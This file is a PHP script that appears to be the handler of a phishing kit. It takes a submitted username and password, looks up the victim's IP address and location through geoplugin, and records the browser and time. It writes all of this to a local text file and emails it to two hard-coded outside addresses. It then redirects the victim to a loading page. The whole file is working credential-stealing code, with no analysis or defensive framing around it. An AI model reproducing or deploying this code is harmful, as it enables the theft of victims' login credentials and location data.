<?php
$email = $_POST['username'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "username: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "============= [ Loc Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";
$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);

$domain = 'Korea';
$subj = "I don see result";
$from = "From: $domain<west>\n";
mail("ki.desmi@yahoo.com, li.zhengcongi@gmail.com",$subj,$message,$from,$domain);

header("Location: loading.php");
?>